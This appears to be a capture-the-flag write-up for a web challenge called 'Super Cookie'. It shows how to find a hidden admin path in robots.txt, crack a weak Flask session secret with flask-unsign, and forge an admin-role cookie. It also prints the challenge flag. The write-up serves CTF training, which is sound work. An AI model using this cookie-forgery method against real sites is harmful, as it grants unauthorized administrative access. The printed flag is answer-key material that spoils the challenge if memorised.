# 🍪 Super Cookie

| | |
|---|---|
| **Category** | Web |
| **Points** | 100 |
| **Flag** | `InIt{C00k1e_F0rg3ry_1s_Sup3r}` |

## 📝 Challenge Analysis

A small corporate story portal with an admin area restricted to authorized staff.

## 🛠️ Solution

### 1. Finding the hidden endpoint
`http://<target>:3000/robots.txt` shows:

```text
User-agent: *
Disallow: /admin/8f14e45f-ea9d-4b21-9c6d-62f8f7a6c311
```

### 2. Inspecting the session cookie
Visiting the admin URL sets a Flask session cookie:

```text
session=eyJyb2xlIjoiZ3Vlc3QiLCJ1c2VybmFtZSI6InZpc2l0b3IifQ...
```

Decoding the payload gives:

```json
{"role": "guest", "username": "visitor"}
```

### 3. Cracking the Flask secret key

```bash
flask-unsign --unsign --cookie "eyJyb2xlIjoi..."
```

Cracked secret: `secret123`

### 4. Forging the admin cookie

```bash
flask-unsign --sign --cookie "{'role': 'admin', 'username': 'admin'}" --secret "secret123"
```

Replace the browser cookie with the forged one and refresh the admin page to get the flag.

## 🏁 Flag

```text
InIt{C00k1e_F0rg3ry_1s_Sup3r}
```

## 🧰 Tools
flask-unsign · Browser DevTools · CyberChef
